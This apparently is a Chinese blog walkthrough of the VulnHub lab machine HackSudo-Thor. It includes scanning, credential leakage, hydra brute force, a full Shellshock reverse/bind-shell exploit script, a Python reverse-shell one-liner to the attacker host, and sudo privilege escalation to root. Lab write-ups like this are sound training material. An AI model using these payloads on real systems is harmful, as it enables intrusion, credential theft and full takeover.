> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/xI11VaHADn2XexfyIDkw8Q)

 ![](http://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsGamtQXiblwiaPhT11gUfcWibGaGzbdzpL0N1UGmGdGP78y7DW7sCUOicTibjbBZHrHewj9uP2Tx3yPiaw/0?wx_fmt=png) ** 伏波路上学安全 ** 专注于渗透测试、代码审计等安全技术，分享安全知识. 24篇原创内容   公众号

![图片](https://mmbiz.qpic.cn/mmbiz_png/ZSH4VlHv0wUiapfR49hWa2eYqkEGbXzkuQ59LbkL2CvAM8l6ZgoEquXibP2LqGdBhxIemS84Jl7iaVqDK9CJXVdCw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/yy4ERibNaTfR1a65O0rmnQbpic6doaYJJDItNsfQWUBHsSJxn4TiaWOOnaB9CBdo2L7YUk8g2UpelUrQORCeDHHbw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

**声明：**文章来自作者日常学习笔记，请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。仅供学习研究

![图片](https://mmbiz.qpic.cn/mmbiz_png/h6R0sRed4WF1Y7qVdRo7SibsRyCm88BjClJeIRVfaBH4LP84hq6VjWz5JKiadnZcuqTUwCVcHoSHlWr6o4X24Oxg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HIvUXxmO2Igh1vy0Tiayxpn8jT7aGK2bPrl3vib0GUP2bnEpNQz2HB37ic3E1HX3mNjyDOqAP15IHgGibZZxtib5VhA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

靶机信息  

-------

下载地址:

```
https://www.vulnhub.com/entry/hacksudo-thor,733/
```

靶场: VulnHub.com

靶机名称: HackSudo-Thor

难度: 简单-中等

发布时间: 2021年8月3日

提示信息:

```
这个盒子是为了提高Linux特权升级和CMS技能而创建的，我希望你们喜欢。
```

目标: 2个flag

  

实验环境
----

```
`攻击机:VMware  kali  192.168.7.3``靶机:Vbox  linux  IP自动获取`
```

  

信息收集
----

### 扫描主机

扫描局域网内的靶机IP地址

```
sudo nmap -sP 192.168.7.1/24
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

扫描到主机地址为192.168.7.153

### 扫描端口

扫描靶机开放的服务端口

```
sudo nmap -sC -sV -p- 192.168.7.153 -oN Thor.nmap
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

扫描到2个开放端口22（SSH）和80（HTTP），21端口有防火墙，先看看80

Web渗透
-----

访问80端口

```
http://192.168.7.153
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

首页是个登录页面，查看源码也没有任何提示，做个目录扫描

### 目录扫描

```
gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://192.168.7.153 -x php,html,txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

目录扫完了，逐一访问

```
http://192.168.7.153/admin_login.php
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

后台登录页面，随手试了几个弱口令无效，其它几个都是无用的信息，访问transactions.php会跳转到home.php页面，抓个包看看跳转前内容

```
http://192.168.7.153/transactions.php
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

有多个页面，看下manage_customers.php页面

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这里带有参数，访问看看

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

访问后可以爆出帐号密码,把他们记下来，把url的id改为2再试试，有几个帐号都试出来

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

只有4个帐号，分别保存为帐号和密码，拿去暴破ssh

user.txt

```
`zakee94``salman``tushar``jon`
```

pass.txt

```
`nafees123``salman123``tushar123``snow123`
```

```
hydra -L user.txt -P pass.txt 192.168.7.153 ssh
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

没有暴出可以登录的帐号密码，web可以登录但是没有管理员权限，这里走不下去了再找找其他的地方

审代码时在news.php页面看到一段注释，目录扫描结果也有cgi-bin目录，我们访问试试

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
http://192.168.7.153/cgi-bin
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

报错没有默认页面，给他做个目录扫描

```
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://192.168.7.153/cgi-bin -x php,html,txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

没扫到可利用的信息，cgi-bin目录下运行的都是程序，应该会有可执行的文件，我们修改一下后缀名再来扫一遍目录

```
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://192.168.7.153/cgi-bin -x php,py,pl,sh,cgi
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

扫到一个shell.sh,exploit-db上去找个exp

### ShellShock(破壳漏洞)

简介：

Shellshock的原理是利用了Bash在导入环境变量函数时候的漏洞，启动Bash的时候，它不但会导入这个函数，而且也会把函数定义后面的命令执行。

        在有些CGI脚本的设计中，数据是通过环境变量来传递的，这样就给了数据提供者利用Shellshock漏洞的机会。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

把payload保存为exp.py

```
`#!/usr/bin/env python``from socket import *``from threading import Thread``import thread, time, httplib, urllib, sys` `stop = False``proxyhost = ""``proxyport = 0``def usage():` `print """` `Shellshock apache mod_cgi remote exploit``Usage:``./exploit.py var=<value>``Vars:``rhost: victim host``rport: victim port for TCP shell binding``lhost: attacker host for TCP shell reversing``lport: attacker port for TCP shell reversing``pages:  specific cgi vulnerable pages (separated by comma)``proxy: host:port proxy``Payloads:``"reverse" (unix unversal) TCP reverse shell (Requires: rhost, lhost, lport)``"bind" (uses non-bsd netcat) TCP bind shell (Requires: rhost, rport)``Example:``./exploit.py payload=reverse rhost=1.2.3.4 lhost=5.6.7.8 lport=1234``./exploit.py payload=bind rhost=1.2.3.4 rport=1234``Credits:``Federico Galatolo 2014``"""` `sys.exit(0)``def exploit(lhost,lport,rhost,rport,payload,pages):` `headers = {"Cookie": payload, "Referer": payload}` `for page in pages:` `if stop:` `return` `print "[-] Trying exploit on : "+page` `if proxyhost != "":` `c = httplib.HTTPConnection(proxyhost,proxyport)` `c.request("GET","http://"+rhost+page,headers=headers)` `res = c.getresponse()` `else:` `c = httplib.HTTPConnection(rhost)` `c.request("GET",page,headers=headers)` `res = c.getresponse()` `if res.status == 404:` `print "[*] 404 on : "+page` `time.sleep(1)` `args = {}``for arg in sys.argv[1:]:` `ar = arg.split("=")` `args[ar[0]] = ar[1]``try:` `args['payload']``except:` `usage()``if args['payload'] == 'reverse':` `try:` `lhost = args['lhost']` `lport = int(args['lport'])` `rhost = args['rhost']` `payload = "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/"+lhost+"/"+str(lport)+" 0>&1 &"` `except:` `usage()``elif args['payload'] == 'bind':` `try:` `rhost = args['rhost']` `rport = args['rport']` `payload = "() { :;}; /bin/bash -c 'nc -l -p "+rport+" -e /bin/bash &'"` `except:` `usage()``else:` `print "[*] Unsupported payload"` `usage()``try:` `pages = args['pages'].split(",")``except:` `pages = ["/cgi-sys/entropysearch.cgi","/cgi-sys/defaultwebpage.cgi","/cgi-mod/index.cgi","/cgi-bin/test.cgi","/cgi-bin-sdb/printenv"]``try:` `proxyhost,proxyport = args['proxy'].split(":")``except:` `pass` `if args['payload'] == 'reverse':` `serversocket = socket(AF_INET, SOCK_STREAM)` `buff = 1024` `addr = (lhost, lport)` `serversocket.bind(addr)` `serversocket.listen(10)` `print "[!] Started reverse shell handler"``    thread.start_new_thread(exploit,(lhost,lport,rhost,0,payload,pages,))``if args['payload'] == 'bind':` `serversocket = socket(AF_INET, SOCK_STREAM)` `addr = (rhost,int(rport))` `thread.start_new_thread(exploit,("",0,rhost,rport,payload,pages,))``buff = 1024``while True:` `if args['payload'] == 'reverse':` `clientsocket, clientaddr = serversocket.accept()` `print "[!] Successfully exploited"` `print "[!] Incoming connection from "+clientaddr[0]` `stop = True` `clientsocket.settimeout(3)` `while True:` `reply = raw_input(clientaddr[0]+"> ")` `clientsocket.sendall(reply+"\n")` `try:` `data = clientsocket.recv(buff)` `print data` `except:` `pass` `    if args['payload'] == 'bind':` `try:` `serversocket = socket(AF_INET, SOCK_STREAM)` `time.sleep(1)` `serversocket.connect(addr)` `print "[!] Successfully exploited"` `print "[!] Connected to "+rhost` `stop = True` `serversocket.settimeout(3)` `while True:` `reply = raw_input(rhost+"> ")` `serversocket.sendall(reply+"\n")` `data = serversocket.recv(buff)` `print data` `except:` `pass`
```

执行payload  

```
python2 exp.py payload=reverse rhost=192.168.7.153 lhost=192.168.7.3 lport=4444 pages=/cgi-bin/shell.sh
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

成功拿到webshell，先找一下敏感文件,这个shell用起来很卡，我们反弹一个shell

kali攻击机上监听3333端口

```
nc -lvvp 3333
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

靶机上执行反弹命令

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.7.3",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

反弹成功，先切换交互shell

```
`python3 -c 'import pty;pty.spawn("/bin/bash")'``export TERM=xterm`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`stty -a``stty raw -echo;fg``reset`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
stty rows 29 columns 90
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

切换完成，还是有点差，先找找敏感文件

/var/backups目录下发现config.php文件

```
`cd /var/backups``ls -al``cat config.php`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

/var/www/html/connect.php文件中找到mysql帐号密码

```
`cd /var/www/html``cat connect.php`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

mysql帐号thor密码password，连接到数据库查看

```
`mysql -uthor -ppassword``show databases;`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

进入hacksudo库查看表名

```
`use hacksudo;``show tables;`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

查看amdin表内容

```
select * from admin;
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到web后台帐号pwd密码password123,目前就找到这些，再来看看有哪些可以利用提权的

```
sudo -l
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

找到hammer.sh文件以thor用户权限执行不需要密码，运行试试

```
sudo -u thor /home/thor/./hammer.sh
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

提权成功，再次切换成交互式shell，查找可提权的程序

```
`python3 -c 'import pty;pty.spawn("/bin/bash")'``sudo -l`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

发现/usr/sbin/service以root用户执行时不需要密码，直接提权

```
`sudo -u root /usr/sbin/service ../../bin/bash``id`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

成功提权到root用户，查看下flag

```
`cd /home``ls``cd thor``ls``cat user.txt`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

拿到user.txt

```
`cd /root``ls``cat root.txt`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

拿到root.txt，游戏结束

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

END

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**这篇文章到这里就结束了,喜欢打靶的小伙伴可以关注"伏波路上学安全"微信公众号,或扫描下面二维码关注,我会持续更新打靶文章,让我们一起在打靶中学习进步吧.**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)